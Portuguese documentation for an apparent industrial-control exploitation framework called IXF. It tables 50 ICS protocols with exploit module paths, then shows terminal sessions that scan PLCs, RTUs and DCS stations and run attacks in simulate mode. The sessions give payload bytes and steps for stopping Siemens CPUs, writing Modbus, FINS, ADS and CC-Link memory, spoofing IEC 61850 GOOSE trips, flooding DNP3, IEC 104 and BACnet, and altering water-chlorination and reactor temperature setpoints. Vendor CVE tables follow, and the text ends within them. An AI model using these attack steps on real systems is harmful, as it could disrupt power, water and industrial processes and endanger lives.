# Protocolos e Vendors

O IXF cobre 50+ protocolos industriais e 150+ vendors OT/ICS mundialmente com módulos de scan, verificação, assessment de segurança e exploit.

---

## Sumário

1. [Cobertura de Protocolo](#cobertura-de-protocolo)
2. [Sessões Completas de Terminal — Top 15 Protocolos](#sessões-completas-de-terminal--top-15-protocolos)
3. [Cobertura de Vendor](#cobertura-de-vendor)
4. [Seção Especial: Brasil e LATAM](#seção-especial-brasil-e-latam)
5. [Comando `protocols`](#comando-protocols)
6. [Comando `vendors`](#comando-vendors)
7. [Adicionando Cobertura para um Novo Vendor](#adicionando-cobertura-para-um-novo-vendor)

---

## Cobertura de Protocolo

Todos os 50 protocolos têm pelo menos um módulo sob `exploits/protocols/` ou `scanners/ics/`.

| Protocolo | Porta Padrão | Caminho do Módulo | Região / Uso |
|-----------|-------------|-------------------|--------------|
| **Modbus TCP** | 502 | `exploits/protocols/modbus/` | Global — SCADA, PLCs |
| **Modbus RTU** | — | `exploits/protocols/modbus/` | Dispositivos seriais via gateways |
| **Siemens S7comm** | 102 | `exploits/protocols/s7comm/` | Siemens S7-200/300/400 |
| **Siemens S7comm+** | 102 | `exploits/protocols/s7comm_plus/` | S7-1200/1500 variante TLS |
| **EtherNet/IP (CIP)** | 44818 | `exploits/protocols/enip/` | Rockwell, Omron, genérico |
| **PROFINET DCP** | Broadcast L2 | `exploits/protocols/profinet/` | Siemens, Beckhoff, WAGO |
| **DNP3** | 20000 | `exploits/protocols/dnp3/` | Redes elétricas, água, petróleo e gás |
| **BACnet/IP** | 47808 UDP | `exploits/protocols/bacnet/` | Automação predial |
| **BACnet/MSTP** | — | `exploits/protocols/bacnet_mstp/` | Redes seriais prediais |
| **IEC 60870-5-104** | 2404 | `exploits/protocols/iec104/` | RTUs de rede elétrica |
| **IEC 61850 MMS** | 102 | `exploits/protocols/iec61850/` | Subestações, relés de proteção |
| **IEC 61850 GOOSE** | L2 multicast | `exploits/protocols/iec61850/` | Intertravamento de relés de proteção |
| **OPC UA** | 4840 | `exploits/protocols/opcua/` | IIoT industrial multiplataforma |
| **OPC DA (DCOM)** | 135 | `exploits/protocols/opc_da/` | SCADA Windows legado |
| **OPC HDA** | 135 | `exploits/protocols/opc_hda/` | Acesso a dados históricos |
| **OPC A&E** | 135 | `exploits/protocols/opc_ae/` | Alarmes e eventos |
| **Omron FINS** | 9600 UDP | `exploits/protocols/fins/` | Séries Omron CS/CJ/NJ |
| **Unitronics PCOM** | 20256 | `exploits/protocols/pcom/` | PLCs Vision/Unistream |
| **Beckhoff ADS/AMS** | 48898 | `exploits/protocols/ads/` | Runtime TwinCAT |
| **MQTT** | 1883 | `exploits/protocols/mqtt/` | Brokers de mensagens IIoT |
| **SNMP** | 161 UDP | `exploits/protocols/snmp/` | Gerenciamento de rede |
| **PROFIBUS DP** | 1962 (gateway) | `exploits/protocols/profibus/` | Siemens, Beckhoff |
| **PROFIBUS PA** | 1962 (gateway) | `exploits/protocols/profibus_pa/` | Instrumentação de processo |
| **HART** | 5094 (HART-IP) | `exploits/protocols/hart/` | Instrumentos de campo |
| **CANopen** | 4001 (gateway) | `exploits/protocols/canopen/` | Controle de máquinas |
| **CC-Link** | 61450 UDP | `exploits/protocols/cc_link/` | Redes Mitsubishi |
| **CC-Link IE Field** | 61450 UDP | `exploits/protocols/cc_link_ie_field/` | Mitsubishi avançado |
| **EtherCAT** | L2 | `exploits/protocols/ethercat/` | Beckhoff, Omron |
| **EtherNet/POWERLINK** | L2 | `exploits/protocols/powerlink/` | B&R, Keba |
| **SERCOS III** | 8008 | `exploits/protocols/sercos/` | Movimento CNC/robótica |
| **IO-Link** | — | `exploits/protocols/iolink/` | Sensores/atuadores inteligentes |
| **INTERBUS** | 1962 (gateway) | `exploits/protocols/interbus/` | Phoenix Contact |
| **ControlNet** | 44818 | `exploits/protocols/controlnet/` | Rockwell legado |
| **DeviceNet** | 44818 | `exploits/protocols/devicenet/` | Rockwell baseado em CAN |
| **PCCC** | 44818 | `exploits/protocols/pccc/` | Allen-Bradley SLC-500 |
| **FL-NET (OPCN-2)** | 7000 UDP | `exploits/protocols/fl_net/` | Fuji Electric/JTEKT |
| **CompoNet** | 9600 (gateway) | `exploits/protocols/componet/` | Omron |
| **Yokogawa Vnet/IP** | 20111 | `exploits/protocols/vnetip/` | DCS CENTUM Yokogawa |
| **FOUNDATION Fieldbus H1** | 1089 (HSE) | `exploits/protocols/foundation_fieldbus/` | Emerson, ABB |
| **FOUNDATION Fieldbus HSE** | 1089 | `exploits/protocols/foundation_fieldbus/` | Rede FF de alta velocidade |
| **LonWorks/LonTalk** | 1628 | `exploits/protocols/lonworks/` | Automação predial |
| **KNX/EIB** | 3671 UDP | `exploits/protocols/knx/` | Automação predial |
| **CIP Safety** | 44818 | `exploits/protocols/ethernet_ip_cip_safety/` | Rockwell GuardLogix |
| **PROFIsafe** | 502 | `exploits/protocols/profisafe/` | Camada de segurança PROFIBUS |
| **FSoE** | L2 | `exploits/protocols/fsoe/` | Beckhoff TwinSAFE |
| **SECS/GEM (HSMS)** | 5000 | `exploits/protocols/hsms/` | Fábricas de semicondutores |
| **Serial-to-Ethernet** | 4001 | `exploits/protocols/serial/` | Moxa NPort, Lantronix |
| **SNMP OT** | 161 UDP | `exploits/protocols/snmp/` | Gerenciamento de dispositivos OT |
| **DNP3 Security Auth** | 20000 | Módulo de assessment | Verificação de implementação SAv5 |
| **OPC UA Security** | 4840 | Módulo de assessment | Auditoria de SecurityMode |
| **IEC 61850 Security** | 102 | Módulo de assessment | Auditoria de auth GOOSE/MMS |

---

## Sessões Completas de Terminal — Top 15 Protocolos

### 1. Modbus TCP (Porta 502)

O Modbus TCP é o protocolo ICS mais amplamente implantado. Sem autenticação, sem criptografia por padrão.

```
ixf > use scanners/ics/modbus_detect
[*] Módulo carregado: Modbus TCP Device Scanner

ixf (Modbus TCP Device Scanner) > set target 192.168.10.5
[*] target => 192.168.10.5

ixf (Modbus TCP Device Scanner) > run
[*] Sondando Modbus TCP em 192.168.10.5:502...
[+] Dispositivo Modbus encontrado. ID de Unidade 1 respondeu.
[i] Resposta MBAP: Transaction=0x0001, Protocol=0x0000, Length=6, Unit=1
[i] Resposta FC3: ByteCount=2, Registro[0]=0x1A4F (6735 dec)
[i] MEI Object ID 0x00 (VendorName): Schneider Electric
[i] MEI Object ID 0x01 (ProductCode): Modicon M340
[i] MEI Object ID 0x02 (MajorMinorRevision): V2.30

ixf (Modbus TCP Device Scanner) > check
[+] Alvo 192.168.10.5:502 responde ao Modbus TCP. Vulnerável a exploits sem auth.

ixf > use exploits/protocols/modbus/modbus_fc16_write_registers
[*] Módulo carregado: Modbus FC16 Write Multiple Registers

ixf (Modbus FC16 Write Registers) > set target 192.168.10.5
[*] target => 192.168.10.5

ixf (Modbus FC16 Write Registers) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: Modbus FC16 Write Multiple Registers
    Passo 1: TCP conectar a 192.168.10.5:502
    Passo 2: Construir MBAP header: Transaction=1, Protocol=0, Unit=1
    Passo 3: FC16 PDU: StartAddr=0x0000, Count=2, ByteCount=4, Values=[0x1234, 0x5678]
    Payload (hex): 00 01 00 00 00 0B 01 10 00 00 00 02 04 12 34 56 78
    Impacto: Registradores de holding 0 e 1 substituídos sem autenticação
[i] [SIMULATE] MITRE ATT&CK for ICS: T0836
```

---

### 2. Siemens S7comm (Porta 102)

S7comm é o protocolo proprietário da Siemens para PLCs S7-200/300/400. Sem autenticação em versões legadas.

```
ixf > use scanners/ics/s7_enumerate
[*] Módulo carregado: Siemens S7 Enumerate

ixf (Siemens S7 Enumerate) > set target 192.168.1.50
[*] target => 192.168.1.50

ixf (Siemens S7 Enumerate) > run
[*] Conectando a 192.168.1.50:102 (COTP TSAP 0x0100)...
[+] COTP Connection Request aceito.
[+] S7comm Setup Communication completo (PDU size: 240 bytes)
[*] Enviando SZL (System Status List) request ID 0x0011...
[+] Informações do Módulo:
    Order Number:  6ES7 315-2AH14-0AB0
    Firmware:      V2.6.7
    Module State:  RUN
    CPU Type:      CPU 315-2 DP
    Autor:         Siemens

[*] Enviando SZL request ID 0x0132 (Protection Level)...
[+] Nível de Proteção: Nenhum (sem senha definida)
[+] Acesso ao Programa: READ/WRITE (sem restrição)

ixf > use exploits/protocols/s7comm/s7_cpu_stop_command
ixf (S7 Stop CPU) > set target 192.168.1.50
ixf (S7 Stop CPU) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: S7comm Stop CPU
    Passo 1: COTP CR, S7comm Setup Communication
    Passo 2: Enviar PDU tipo 0x01 (Job) com Function 0x2F (Stop CPU)
    Payload: 32 01 00 00 00 00 00 08 00 00 28 00 00 00 00 00 FD FF FF
    Impacto: PLC entra em modo STOP — todos os outputs de saída vão para estado seguro
    Recuperação: Requer reinicialização manual no painel ou via STEP7/TIA Portal
[i] [SIMULATE] MITRE ATT&CK for ICS: T0816, T0881
```

---

### 3. EtherNet/IP / CIP (Porta 44818)

Usado por Rockwell Automation (Allen-Bradley), Omron, e outros. Protocolo aberto CIP sobre TCP/IP.

```
ixf > use scanners/ics/enip_scanner
ixf (EtherNet/IP Scanner) > set target 192.168.1.0/24
ixf (EtherNet/IP Scanner) > run

[*] Varrendo sub-rede 192.168.1.0/24 na porta 44818...
[+] 192.168.1.10  — ControlLogix 1756-L71 (Rockwell) | Firmware: v32.11
[+] 192.168.1.15  — CompactLogix 1769-L24 (Rockwell) | Firmware: v31.14
[+] 192.168.1.20  — PowerFlex 525 VFD (Rockwell) | Firmware: v5.001
[+] 192.168.1.25  — Omron NX102-9000 | Firmware: v1.60

ixf > use exploits/protocols/enip/enip_list_identity
ixf (EtherNet/IP List Identity) > set target 192.168.1.10
ixf (EtherNet/IP List Identity) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: EtherNet/IP List Identity (CIP Command 0x63)
    Enviando ListIdentity multicast/unicast — resposta contém:
    VendorID, DeviceType, ProductCode, Revision, Status, SerialNumber
    Produto: Allen-Bradley 1756-L71 ControlLogix5571
    Serial: 00C09200
    Revision: 32.11
[i] [SIMULATE] MITRE ATT&CK for ICS: T0846
```

---

### 4. DNP3 (Porta 20000)

Protocolo amplamente usado em utilidades de energia elétrica, água e petróleo. Suporta autenticação opcionalmente (SAv5).

```
ixf > use scanners/ics/dnp3_data_link_scan
ixf (DNP3 Data Link Scanner) > set target 10.0.1.0/24
ixf (DNP3 Data Link Scanner) > run

[*] Varrendo 10.0.1.0/24 na porta TCP 20000 (DNP3)...
[+] 10.0.1.5   — RTU DNP3 respondeu. Address=1
[+] 10.0.1.10  — RTU DNP3 respondeu. Address=2
[+] 10.0.1.15  — Master DNP3 respondeu. Address=3

ixf > use exploits/protocols/dnp3/dnp3_unsolicit_flood
ixf (DNP3 Unsolicited Response Flood) > set target 10.0.1.5
ixf (DNP3 Unsolicited Response Flood) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: DNP3 Unsolicited Response Flood
    Fase 1: Enumerar endereço DNP3 do alvo via Data Link Layer
    Fase 2: Injetar 1000 respostas não solicitadas falsas por segundo
    Fase 3: Master SCADA fica sobrecarregado com eventos — DoS efetivo
    Impacto: Comunicação entre RTU e master SCADA interrompida
    Duração do ataque: Configurable (padrão: 60 segundos)
[i] [SIMULATE] MITRE ATT&CK for ICS: T0814, T0803

ixf > use assessment/protocols/dnp3_security_audit
ixf (DNP3 Security Audit) > set target 10.0.1.5
ixf (DNP3 Security Audit) > run

  DNP3 Secure Authentication v5 Assessment — 10.0.1.5:20000
  ──────────────────────────────────────────────────────────────────
  Verificação                           Resultado  Notas
  SAv5 challenge-response               MANUAL     Verificar conforme IEC 62351-5
  Proteção contra replay                MANUAL     Chaves de sessão únicas aplicadas
  Verificação de número de sequência    MANUAL     Números de seq de aplicação validados
  Controle não autorizado               MANUAL     Testar controle sem SAv5
```

---

### 5. IEC 60870-5-104 (Porta 2404)

Padrão de telecontrol amplamente usado em redes elétricas europeias e sul-americanas.

```
ixf > use scanners/ics/iec104_scan
ixf (IEC 104 Scanner) > set target 172.16.0.0/24
ixf (IEC 104 Scanner) > run

[*] Varrendo 172.16.0.0/24 na porta 2404 (IEC 60870-5-104)...
[+] 172.16.0.10  — RTU IEC 104 respondeu. ASDU Address=1
[+] 172.16.0.20  — RTU IEC 104 respondeu. ASDU Address=2

ixf > use exploits/protocols/iec104/iec104_startdt_flood
ixf (IEC 104 STARTDT Flood) > set target 172.16.0.10
ixf (IEC 104 STARTDT Flood) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: IEC 104 STARTDT Flood
    Fase 1: Estabelecer sessão TCP com RTU na porta 2404
    Fase 2: Enviar STARTDT ACT (U-frame) para iniciar transmissão de dados
    Fase 3: Injetar múltiplos STARTDTs concorrentes para esgotar conexões
    Impacto: RTU satura conexões — master SCADA perde comunicação
    Contexto real: Industroyer 2016 usou técnica similar na Ukrenergo
[i] [SIMULATE] MITRE ATT&CK for ICS: T0814, T0815, T0803
```

---

### 6. IEC 61850 MMS/GOOSE (Portas 102 e L2 multicast)

Padrão de comunicação para automação de subestações elétricas.

```
ixf > use assessment/protocols/iec61850_security_audit
ixf (IEC 61850 Security Audit) > set target 192.168.5.100
ixf (IEC 61850 Security Audit) > run

  IEC 61850 Substation Security Assessment — 192.168.5.100:102
  ──────────────────────────────────────────────────────────────────
  Verificação                          Resultado  Notas
  Autenticação GOOSE                   MANUAL     IEC 62351-6 HMAC habilitado?
  Controle de acesso MMS               MANUAL     Auth MMS exigida para controles?
  Integridade de SAMPLED VALUES        MANUAL     Proteção de integridade SV?
  Segmentação de rede de subestação    MANUAL     Barramento estação/bay/processo segm.?

ixf > use exploits/protocols/iec61850/iec61850_goose_spoof
ixf (IEC 61850 GOOSE Spoof) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: IEC 61850 GOOSE Frame Spoofing
    Fase 1: Capturar frames GOOSE legítimos do multicast L2 (01:0C:CD:01:xx:xx)
    Fase 2: Modificar GoID, DataSet ou valores de status nos frames capturados
    Fase 3: Reinjetar frames com StNum incrementado (override de proteção)
    Impacto: Relé de proteção recebe comandos de trip falsos — disjuntor trip
    Sem IEC 62351-6 HMAC: sem proteção contra replay/spoofing
[i] [SIMULATE] MITRE ATT&CK for ICS: T0855, T0856
```

---

### 7. OPC UA (Porta 4840)

Protocolo industrial moderno com suporte a segurança opcional. Amplamente adotado em IIoT.

```
ixf > use scanners/ics/opcua_discovery
ixf (OPC UA Discovery) > set target 192.168.1.0/24
ixf (OPC UA Discovery) > run

[*] Varrendo 192.168.1.0/24 na porta 4840 (OPC UA)...
[+] 192.168.1.100  — OPC UA Server (Kepware KepServerEX v6.13)
    Endpoints: opc.tcp://192.168.1.100:4840/KEPServerEX/
    SecurityMode: None  [!] Sem segurança — VULNERÁVEL
[+] 192.168.1.200  — OPC UA Server (Ignition 8.1.x)
    Endpoints: opc.tcp://192.168.1.200:62541/discovery
    SecurityMode: Basic256Sha256  [OK] Segurança habilitada

ixf > use exploits/protocols/opcua/opcua_anonymous_browse
ixf (OPC UA Anonymous Browse) > set target 192.168.1.100
ixf (OPC UA Anonymous Browse) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: OPC UA Anonymous Browse
    Fase 1: Conectar a opc.tcp://192.168.1.100:4840 sem credenciais
    Fase 2: Chamar Browse service no Root folder (ns=0;i=84)
    Fase 3: Iterar namespace para extrair todos os nós e tags
    Resultado: Estrutura completa de tags de processo exposta anonimamente
    Dados vazados: Tag names, valores, tipos de dados, estrutura de process
[i] [SIMULATE] MITRE ATT&CK for ICS: T0861, T0802
```

---

### 8. BACnet/IP (Porta 47808 UDP)

Protocolo de automação predial. Amplamente usado em sistemas HVAC, iluminação e controle de acesso.

```
ixf > use scanners/ics/bacnet_discovery
ixf (BACnet Discovery) > set target 192.168.100.0/24
ixf (BACnet Discovery) > run

[*] Enviando BACnet Who-Is broadcast para 192.168.100.255:47808...
[+] 192.168.100.10  — BACnet/IP I-Am respondeu. Device ID=1001, Vendor=Tridium Niagara4
[+] 192.168.100.15  — BACnet/IP I-Am respondeu. Device ID=2001, Vendor=Distech Controls ECLYPSE
[+] 192.168.100.20  — BACnet/IP I-Am respondeu. Device ID=3001, Vendor=Johnson Controls Metasys

ixf > use exploits/protocols/bacnet/bacnet_who_is_flood
ixf (BACnet Who-Is Flood) > set target 192.168.100.255
ixf (BACnet Who-Is Flood) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: BACnet Who-Is Broadcast Flood
    Fase 1: Injetar 10.000 Who-Is broadcasts UDP por segundo
    Fase 2: Todos os dispositivos BACnet na sub-rede tentam responder
    Fase 3: Saturação de rede — comunicação normal BACnet interrompida
    Impacto: HVAC, iluminação, controle de acesso — todos perturbados
[i] [SIMULATE] MITRE ATT&CK for ICS: T0814
```

---

### 9. Omron FINS (Porta 9600 UDP)

Protocolo proprietário Omron para PLCs CS/CJ/NJ. Sem autenticação em versões mais antigas.

```
ixf > use scanners/ics/omron_fins_scan
ixf (Omron FINS Scanner) > set target 192.168.2.0/24
ixf (Omron FINS Scanner) > run

[*] Varrendo 192.168.2.0/24 na porta UDP 9600 (Omron FINS)...
[+] 192.168.2.50  — PLC Omron CJ2M respondeu.
    Network=0, Node=1, Unit=0
    CPU Unit Type: CJ2M-CPU31
    Firmware: 2.00

ixf > use exploits/protocols/fins/fins_memory_area_write
ixf (Omron FINS Memory Area Write) > set target 192.168.2.50
ixf (Omron FINS Memory Area Write) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: Omron FINS Memory Area Write
    Fase 1: UDP FINS Write Memory Area: Header ICF=0x80, MRC=0x01, SRC=0x02
    Fase 2: Memory Area Code=0xB3 (HR — Holding Relays), Beg Address=0x0000
    Fase 3: Dados a escrever: 0x0001 (setar primeiro relay de holding)
    Impacto: Relay HR0 setado sem autenticação — output digital ligado
[i] [SIMULATE] MITRE ATT&CK for ICS: T0836, T0831
```

---

### 10. Beckhoff ADS/AMS (Porta 48898)

Protocolo ADS (Automation Device Specification) para runtime TwinCAT. Acesso direto a variáveis PLC.

```
ixf > use scanners/ics/ads_scanner
ixf (Beckhoff ADS Scanner) > set target 192.168.3.10
ixf (Beckhoff ADS Scanner) > run

[*] Conectando a 192.168.3.10:48898 (ADS/AMS)...
[+] ADS device respondeu.
    AMS Net ID: 192.168.3.10.1.1
    TwinCAT Version: 3.1.4024.20
    Device State: RUN

ixf > use exploits/protocols/ads/ads_variable_write
ixf (ADS Variable Write) > set target 192.168.3.10
ixf (ADS Variable Write) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: ADS Write Variable
    Fase 1: Resolver símbolo via ADS Read Write (AdsCommand=0x0009)
    Fase 2: Escrever valor em variável PLC via ADS Write (AdsCommand=0x0003)
    Exemplo: Escrever BOOL TRUE em variável 'MAIN.bOutputEnable'
    Impacto: Variável PLC modificada sem autenticação (ADS não tem auth por padrão)
[i] [SIMULATE] MITRE ATT&CK for ICS: T0836
```

---

### 11. MQTT (Porta 1883)

Protocolo de mensagens leve usado em IIoT. Frequentemente implantado sem autenticação.

```
ixf > use scanners/ics/mqtt_scanner
ixf (MQTT Scanner) > set target 192.168.50.10
ixf (MQTT Scanner) > run

[*] Conectando a 192.168.50.10:1883 (MQTT)...
[+] Broker MQTT respondeu (Eclipse Mosquitto 2.0.15)
[!] Conexão aceita sem credenciais — broker sem autenticação!
[i] Tópicos descobertos via SUBSCRIBE #:
    iot/sensors/temperature
    iot/sensors/pressure
    plc/outputs/valve1
    plc/outputs/valve2
    scada/alarms/high_pressure

ixf > use exploits/protocols/mqtt/mqtt_topic_inject
ixf (MQTT Topic Inject) > set target 192.168.50.10
ixf (MQTT Topic Inject) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: MQTT Topic Injection
    Fase 1: Conectar ao broker MQTT sem auth
    Fase 2: PUBLISH para tópico plc/outputs/valve1 com payload "OPEN"
    Fase 3: Qualquer subscriber (PLC, HMI) recebe o comando
    Impacto: Válvula aberta remotamente sem autenticação
[i] [SIMULATE] MITRE ATT&CK for ICS: T0855, T0836
```

---

### 12. PROFINET DCP (Broadcast L2)

Protocolo de descoberta e configuração de dispositivos Siemens/Beckhoff em nível de enlace.

```
ixf > use scanners/ics/profinet_dcp_scan
ixf (PROFINET DCP Scanner) > set target eth0
ixf (PROFINET DCP Scanner) > run

[*] Enviando PROFINET DCP Identify All (multicast 01:0E:CF:00:00:00) em eth0...
[+] Dispositivo PROFINET encontrado: 00:1B:1B:XX:XX:01
    NameOfStation: plc-linha1
    IP: 192.168.4.10 | Máscara: 255.255.255.0 | Gateway: 192.168.4.1
    TypeOfStation: CPU 1215C DC/DC/DC
    OrderID: 6ES7 215-1AG40-0XB0

ixf > use exploits/protocols/profinet/profinet_dcp_reset_factory
ixf (PROFINET DCP Factory Reset) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: PROFINET DCP Factory Reset
    Fase 1: Enviar DCP Block ResetToFactory (BlockType=0x0005, BlockLen=4)
    Fase 2: Dispositivo reinicia para configurações de fábrica
    Fase 3: Configuração de rede perdida — dispositivo offline
    Impacto: PLC perde configuração IP — inacessível por rede
[i] [SIMULATE] MITRE ATT&CK for ICS: T0816
```

---

### 13. Unitronics PCOM (Porta 20256)

Protocolo proprietário dos PLCs Vision/Unistream da Unitronics. Explorado em ataques reais em 2023-2024.

```
ixf > use scanners/ics/unitronics_pcom_scan
ixf (Unitronics PCOM Scanner) > set target 10.10.0.0/24
ixf (Unitronics PCOM Scanner) > run

[*] Varrendo 10.10.0.0/24 na porta TCP 20256 (Unitronics PCOM)...
[+] 10.10.0.50  — PLC Unitronics Vision respondeu.
    Controller Model: V700
    Firmware: 9.8.31
    Program Name: WaterTreatment_v3

ixf > use exploits/protocols/pcom/pcom_read_write_memory
ixf (Unitronics PCOM Read/Write) > set target 10.10.0.50
ixf (Unitronics PCOM Read/Write) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: Unitronics PCOM Memory Write
    Fase 1: Conectar TCP à porta 20256
    Fase 2: Comando PCOM 0x02 (Write Operands): escrever em MI (Integer Memory)
    Fase 3: Modificar MI100 (Setpoint de Cloração) para 999
    Impacto: Controle de cloração de água descontrolado
    Contexto real: Hacktivistas iranianos atacaram sistemas de água dos EUA via PCOM (2023-2024)
[i] [SIMULATE] MITRE ATT&CK for ICS: T0836, T0819
```

---

### 14. Yokogawa Vnet/IP (Porta 20111)

Protocolo proprietário para DCS CENTUM VP da Yokogawa. Uso predominante em petroquímica e refino.

```
ixf > use scanners/ics/vnetip_scan
ixf (Yokogawa Vnet/IP Scanner) > set target 172.30.0.0/24
ixf (Yokogawa Vnet/IP Scanner) > run

[*] Varrendo 172.30.0.0/24 na porta TCP 20111 (Yokogawa Vnet/IP)...
[+] 172.30.0.100  — Yokogawa CENTUM VP respondeu.
    Station Name: FCS0101
    Domain: PLANT-01
    Version: R6.06.10

ixf > use exploits/protocols/vnetip/vnetip_tag_write
ixf (Yokogawa Vnet/IP Tag Write) > set target 172.30.0.100
ixf (Yokogawa Vnet/IP Tag Write) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: Yokogawa Vnet/IP Tag Write
    Fase 1: Estabelecer sessão Vnet/IP com FCS (Field Control Station)
    Fase 2: Identificar tags de processo críticos via enumeração de namespace
    Fase 3: Escrever valor alterado em tag de setpoint de temperatura
    Impacto: Setpoint de processo modificado — reação exotérmica descontrolada possível
[i] [SIMULATE] MITRE ATT&CK for ICS: T0836, T0855
```

---

### 15. CC-Link (Porta 61450 UDP)

Protocolo de rede de campo da Mitsubishi Electric. Amplamente usado em automação industrial japonesa e asiática.

```
ixf > use scanners/ics/cc_link_scan
ixf (CC-Link Scanner) > set target 192.168.10.0/24
ixf (CC-Link Scanner) > run

[*] Varrendo 192.168.10.0/24 na porta UDP 61450 (CC-Link)...
[+] 192.168.10.10  — Master CC-Link IE respondeu.
    Station: 1 | Model: MELSEC iQ-R R04CPU | Firmware: 30

ixf > use exploits/protocols/cc_link/cc_link_ie_unauthorized_write
ixf (CC-Link IE Unauthorized Write) > set target 192.168.10.10
ixf (CC-Link IE Unauthorized Write) > run

┌──────────────────────────────────────────────────────────────────────────┐
│  [SIMULATE MODE]  Nenhum pacote enviado ao alvo.                         │
└──────────────────────────────────────────────────────────────────────────┘
[i] [SIMULATE] O que aconteceria: CC-Link IE Unauthorized Write
    Fase 1: Enviar Frame CC-Link IE tipo 0x0001 (Write Request)
    Fase 2: Escrever em D (Data Register) D0-D10 com valores arbitrários
    Impacto: Registradores de dados PLC MELSEC modificados sem autenticação
[i] [SIMULATE] MITRE ATT&CK for ICS: T0836
```

---

## Cobertura de Vendor

### Usando o Comando `vendors`

```
ixf > vendors

  Vendors (150 cobertos)
  ─────────────────────────────────────────────────────────────────
  Vendor                              Módulos CVE
  schneider_electric                       39
  rockwell_automation                      38
  siemens                                  27
  honeywell                                20
  abb                                      22
  ge / ge_vernova                          18
  emerson                                  16
  aveva / osisoft                          14
  advantech                                15
  delta_electronics                        11
  omron                                    12
  moxa                                     10
  ... (140+ vendors adicionais) ...

ixf > vendors japan

  Vendors (7 cobertos — Japão)
  ─────────────────────────────────────────────────────────────────
  Yokogawa                                  5
  Mitsubishi Electric                       3
  Omron                                    12
  Keyence                                   2
  FANUC                                     2
  Panasonic                                 1
  Fuji Electric                             2

ixf > vendors brazil

  Vendors (6 cobertos — Brasil)
  ─────────────────────────────────────────────────────────────────
  WEG                                       2
  ALTUS                                     1
  Novus Automation                          1
  Elipse Software                           2
  Smar                                      1
  Digicon                                   1
```

---

## Cobertura de Vendor por Região

### Europa

| Vendor | País | Produtos Principais | CVEs |
|--------|------|---------------------|------|
| Siemens | Alemanha | S7-1200/1500, WinCC, PCS 7, SCALANCE, Desigo CC | 27 |
| Schneider Electric | França | Modicon M340/M580, EcoStruxure, Andover Continuum | 39 |
| ABB | Suíça | System 800xA, AC500, relés Relion | 22 |
| Beckhoff | Alemanha | TwinCAT, EtherCAT, CX series | 5 |
| Phoenix Contact | Alemanha | PLCnext, WebVisit HMI, mGuard | 6 |
| WAGO | Alemanha | PFC100/PFC200, e!COCKPIT | 2 |
| Pilz | Alemanha | PNOZmulti, PSS4000 Safety | 1 |
| B&R Automation | Áustria | APROL DCS, X20, ctrlX | 2 |
| Festo | Alemanha | CPX-AP-I, AX | 1 |
| Endress+Hauser | Suíça | Fieldgate, VEGAPULS | 2 |
| Pepperl+Fuchs | Alemanha | IO-Link Masters | 1 |
| SICK AG | Alemanha | S3000 safety scanners | 2 |
| HMS Networks | Suécia | Anybus X-Gateway, eWON Flexy | 2 |
| Belden/Hirschmann | Alemanha | Eagle One firewall, switches RSPE | 2 |
| Westermo | Suécia | switches industriais Lynx | 1 |
| Ruggedcom (Siemens) | Alemanha | roteadores ROS/ROX II | 2 |
| Metso/Valmet | Finlândia | DNA DCS | 1 |
| Danfoss | Dinamarca | drives VLT/VACON | 1 |
| Krohne | Alemanha | computadores de fluxo SUMMIT | 2 |
| Lenze | Alemanha | drives i550 | 1 |
| Hilscher | Alemanha | fieldbus netX/cifX | 1 |
| Softing | Alemanha | DataFEED OPC, OT Security Box | 2 |
| Saia-Burgess | Suíça | PLC Série PCD | 1 |
| Sauter AG | Suíça | moduWeb Vision BAS | 1 |
| Distech Controls | França | ECLYPSE BACnet | 1 |
| Sofrel | França | LS-4x RTU água | 1 |

### Américas

| Vendor | País | Produtos Principais | CVEs |
|--------|------|---------------------|------|
| Rockwell Automation | EUA | ControlLogix, FactoryTalk, Studio 5000 | 38 |
| Honeywell | EUA | Experion PKS, Spyder BAS, Enraf | 20 |
| Emerson | EUA | DeltaV DCS, ROC800, válvulas Fisher | 16 |
